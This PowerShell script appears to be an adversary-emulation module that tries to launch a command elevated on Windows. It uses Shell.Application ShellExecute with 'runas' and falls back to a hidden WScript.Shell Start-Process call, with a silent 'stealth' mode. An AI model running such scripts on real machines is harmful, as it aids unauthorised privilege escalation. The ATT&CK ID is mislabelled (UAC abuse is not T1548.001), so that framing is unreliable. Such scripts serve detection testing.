# T1548.001F - Elevation via COM Objects
# MITRE ATT&CK Technique: T1548.001 - Abuse Elevation Control Mechanism: COM Elevation
# Platform: Windows | Privilege: User -> Admin | Tactic: Defense Evasion

#Requires -Version 5.0

# Function 1: Get-Configuration (40-50 lines max)
function Get-Configuration {
    param()
    
    $config = @{
        Success = $false
        Technique = "T1548.001F"
        TechniqueName = "Elevation via COM Objects"
        OutputBase = $env:OUTPUT_BASE
        Timeout = if ($env:TIMEOUT) { [int]$env:TIMEOUT } else { 300 }
        Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Results = @{
            InitialPrivilege = ""
            ComObject = ""
            ComMethod = ""
            CommandExecuted = ""
            ElevationSuccess = $false
            ErrorMessage = ""
        }
    }
    
    # Load technique-specific variables
    $Config.ComObject = if ($env:T1548_001F_COM_OBJECT) { $env:T1548_001F_COM_OBJECT } else { "Shell.Application" }
    $Config.ComMethod = if ($env:T1548_001F_COM_METHOD) { $env:T1548_001F_COM_METHOD } else { "ShellExecute" }
    $Config.TargetCommand = if ($env:T1548_001F_TARGET_COMMAND) { $env:T1548_001F_TARGET_COMMAND } else { "cmd.exe" }
    $Config.OutputMode = if ($env:T1548_001F_OUTPUT_MODE) { $env:T1548_001F_OUTPUT_MODE } else { "simple" }
    $Config.SilentMode = if ($env:T1548_001F_SILENT_MODE -eq "true") { $true } else { $false }
    
    # Validate COM support
    try {
        $testCom = New-Object -ComObject $Config.ComObject -ErrorAction Stop
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($testCom) | Out-Null
    } catch {
        $Config.Results.ErrorMessage = "COM object not available: $($Config.ComObject)"
        return $config
    }
    
    # Check UAC status
    $uacEnabled = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA -eq 1
    if (-not $uacEnabled) {
        $Config.Results.ErrorMessage = "UAC is disabled"
        return $config
    }
    
    $Config.Success = $true
    return $config
}

# Specialized function: Execute via COM with elevation
function Invoke-ComElevatedExecution {
    param($ComObject, $ComMethod, $TargetCommand)
    
    try {
        $shell = New-Object -ComObject $ComObject
        
        switch ($ComMethod) {
            "ShellExecute" {
                # Use ShellExecute with runas verb for elevation
                $shell.ShellExecute($TargetCommand, "", "", "runas", 1)
            }
            "Windows" {
                # Alternative method using Windows collection
                $shell.Windows() | ForEach-Object {
                    if ($_.FullName -match "explorer.exe") {
                        $_.Navigate2("file:///$TargetCommand")
                    }
                }
            }
            default {
                # Generic method invocation
                $shell.$ComMethod($TargetCommand)
            }
        }
        
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# Specialized function: Alternative COM elevation
function Invoke-AlternativeComElevation {
    param($TargetCommand)
    
    try {
        # Try using WScript.Shell as alternative
        $wscript = New-Object -ComObject WScript.Shell
        $wscript.Run("powershell Start-Process '$TargetCommand' -Verb RunAs", 0, $false)
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($wscript) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# Function 2: Invoke-MicroTechniqueAction (30-40 lines max)
function Invoke-MicroTechniqueAction {
    param($Config)
    
    # Get initial privilege level
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $Config.Results.InitialPrivilege = if ($isAdmin) { "Administrator" } else { "User" }
    
    if (-not $Config.SilentMode) {
        Write-Host "[INFO] Starting COM elevation..." -ForegroundColor Yellow
    }
    
    # ATOMIC ACTION: COM object elevation
    $Config.Results.ComObject = $Config.ComObject
    $Config.Results.ComMethod = $Config.ComMethod
    $Config.Results.CommandExecuted = $Config.TargetCommand
    
    # Execute via COM with elevation
    $elevationSuccess = Invoke-ComElevatedExecution -ComObject $Config.ComObject `
                                                    -ComMethod $Config.ComMethod `
                                                    -TargetCommand $Config.TargetCommand
    
    if (-not $elevationSuccess) {
        # Try alternative method
        $elevationSuccess = Invoke-AlternativeComElevation -TargetCommand $Config.TargetCommand
        
        if (-not $elevationSuccess) {
            $Config.Results.ErrorMessage = "Failed to elevate via COM"
            return $Config
        }
    }
    
    $Config.Results.ElevationSuccess = $true
    
    if (-not $Config.SilentMode) {
        Write-Host "[SUCCESS] COM elevation executed" -ForegroundColor Green
    }
    
    return $Config
}

# Function 3: Write-StandardizedOutput (30-40 lines max)
function Write-StandardizedOutput {
    param($Config)
    
    $outputDir = Join-Path $Config.OutputBase "T1548.001f_com_elevation_$($Config.Timestamp)"
    
    switch ($Config.OutputMode) {
        "simple" {
            # Realistic attacker output
            if ($Config.Results.ElevationSuccess) {
                Write-Host "`n[+] COM Elevation Successful" -ForegroundColor Green
                Write-Host "    Initial Privilege: $($Config.Results.InitialPrivilege)"
                Write-Host "    COM Object: $($Config.Results.ComObject)"
                Write-Host "    COM Method: $($Config.Results.ComMethod)"
                Write-Host "    Command: $($Config.Results.CommandExecuted)"
            } else {
                Write-Host "`n[-] COM Elevation Failed: $($Config.Results.ErrorMessage)" -ForegroundColor Red
            }
        }
        
        "debug" {
            # Structured JSON for analysis
            $null = New-Item -ItemType Directory -Path $outputDir -Force
            $debugOutput = @{
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Technique = $Config.Technique
                TechniqueName = $Config.TechniqueName
                Platform = "Windows"
                ExecutionResults = $Config.Results
                EnvironmentContext = @{
                    Hostname = $env:COMPUTERNAME
                    Username = $env:USERNAME
                    OSVersion = [System.Environment]::OSVersion.VersionString
                }
            }
            $debugOutput | ConvertTo-Json -Depth 4 | Out-File "$outputDir\t1548_001f_elevation_via_com.json"
            Write-Host "[DEBUG] Results saved to: $outputDir" -ForegroundColor Cyan
        }
        
        "stealth" {
            # Silent operation - no output
        }
    }
}

# Function 4: Main (20-30 lines max)
function Main {
    # Exit codes: 0=SUCCESS, 1=FAILED, 2=SKIPPED
    
    # Step 1: Get configuration
    $Config = Get-Configuration
    if (-not $Config.Success) {
        if ($Config.Results.ErrorMessage -like "*UAC is disabled*") {
            Write-Host "[SKIP] $($Config.Results.ErrorMessage)" -ForegroundColor Yellow
            exit 2
        }
        Write-Host "[ERROR] $($Config.Results.ErrorMessage)" -ForegroundColor Red
        exit 1
    }
    
    # Step 2: Execute micro-technique
    $config = Invoke-MicroTechniqueAction -Config $config
    
    # Step 3: Write output
    Write-StandardizedOutput -Config $config
    
    # Return appropriate exit code
    if ($Config.Results.ElevationSuccess) {
        exit 0
    } else {
        exit 1
    }
}

# Execute main function
Main

